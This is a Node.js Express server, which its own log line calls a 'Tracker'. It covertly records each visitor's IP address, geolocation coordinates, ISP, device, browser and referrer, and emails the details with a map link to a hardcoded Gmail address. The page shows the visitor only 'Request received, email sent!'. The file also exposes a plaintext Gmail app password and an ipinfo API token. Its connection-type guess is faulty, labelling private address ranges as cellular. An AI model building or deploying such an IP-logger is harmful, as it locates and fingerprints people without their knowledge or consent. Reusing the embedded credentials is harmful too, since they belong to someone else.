const express = require('express');
const nodemailer = require('nodemailer');
const axios = require('axios');
const UAParser = require('ua-parser-js');
const app = express();

app.set('trust proxy', true);
const sessionStarts = {};

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'staysane.rz@gmail.com',
    pass: 'nvkq cudo ibhh usdr',
  },
});

app.use((req, res, next) => {
  const ip = req.ip;
  if (!sessionStarts[ip]) {
    sessionStarts[ip] = new Date();
  }
  next();
});

app.get('/', async (req, res) => {
  const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'] || '';
  const referrer = req.headers['referer'] || 'direct';

  const timestamp = new Date();
  const day = timestamp.toLocaleString('en-US', { weekday: 'long' });
  const date = timestamp.toLocaleString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
  const time = timestamp.toLocaleString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });

  if (userAgent.includes('UptimeRobot')) {
    return res.status(204).end();
  }

  const parser = new UAParser(userAgent);
  const device = parser.getDevice();
  const os = parser.getOS();
  const browser = parser.getBrowser();
  const engine = parser.getEngine();
  const cpu = parser.getCPU();
  const deviceType = device.type || 'Unknown';

  const connectionType = inferConnectionType(req);
  const sessionStart = sessionStarts[ip];
  const sessionDuration = sessionStart ? `${(new Date() - sessionStart) / 1000} seconds` : 'First visit';

  let location_ipinfo = 'N/A';
  let lat_ipinfo = null;
  let lon_ipinfo = null;

  try {
    const ipinfoToken = '5cbabbc7ad7b57';
    const geo = await axios.get(`https://ipinfo.io/${ip}?token=${ipinfoToken}`);
    const { city, region, country, org, loc } = geo.data;

    location_ipinfo = `${city}, ${region}, ${country} (ISP: ${org})`;

    const [latitude, longitude] = loc.split(',');
    lat_ipinfo = latitude;
    lon_ipinfo = longitude;
  } catch (err) {
    console.warn('IPInfo failed:', err.message);
  }

  const mailOptions = {
    from: 'zyron',
    to: 'xraymundzyron@gmail.com',
    subject: 'Visitor accessed your URL',
    html: `
      <html>
        <head>
          <style>
            body {
              font-family: Arial, sans-serif;
              background-color: #f4f4f4;
              color: #333;
              margin: 0;
              padding: 0;
            }
            h1, h2 {
              color: #007bff;
            }
            .section {
              margin: 20px 0;
              padding: 10px;
              background-color: #fff;
              border: 1px solid #ddd;
              border-radius: 5px;
            }
            .timestamp, .location, .device-info, .session-info {
              padding: 10px;
            }
            .map-link {
              color: #007bff;
              text-decoration: none;
            }
            .map-link:hover {
              text-decoration: underline;
            }
          </style>
        </head>
        <body>
          <h1>New Visit Detected!</h1>
          <div class="section timestamp">
            <h2>Timestamp</h2>
            <p><strong>Day:</strong> ${day}</p>
            <p><strong>Date:</strong> ${date}</p>
            <p><strong>Time:</strong> ${time}</p>
          </div>
          <div class="section location">
            <h2>Location</h2>
            <p><strong>Location:</strong> ${location_ipinfo}</p>
            <p><strong>Coordinates:</strong> ${lat_ipinfo}, ${lon_ipinfo}</p>
            <p><a href="https://www.google.com/maps?q=${lat_ipinfo},${lon_ipinfo}" class="map-link" target="_blank">View on Google Maps</a></p>
          </div>
          <div class="section device-info">
            <h2>Device Information</h2>
            <p><strong>Device Type:</strong> ${deviceType}</p>
            <p><strong>Brand:</strong> ${device.vendor || 'Unknown'}</p>
            <p><strong>Model:</strong> ${device.model || 'Unknown'}</p>
            <p><strong>OS:</strong> ${os.name || 'OS'} ${os.version || ''}</p>
            <p><strong>Browser:</strong> ${browser.name || 'Browser'} ${browser.version || ''}</p>
            <p><strong>Engine:</strong> ${engine.name || 'Unknown engine'}</p>
            <p><strong>CPU:</strong> ${cpu.architecture || 'Unknown CPU architecture'}</p>
          </div>
          <div class="section session-info">
            <h2>Session Information</h2>
            <p><strong>Connection:</strong> ${connectionType}</p>
            <p><strong>Session Duration:</strong> ${sessionDuration}</p>
            <p><strong>User Agent:</strong> ${userAgent}</p>
            <p><strong>Referrer:</strong> ${referrer}</p>
          </div>
        </body>
      </html>
    `
  };

  transporter.sendMail(mailOptions, (error) => {
    if (error) console.error('Email failed:', error);
  });

  res.send('Request received, email sent!');
});

function inferConnectionType(req) {
  const ip = req.ip;
  if (ip.startsWith('192.') || ip.startsWith('172.16.') || ip.startsWith('10.')) {
    return 'Likely Mobile (Cellular)';
  }
  return 'Likely WiFi/Landline';
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Tracker running on port ${PORT}`));
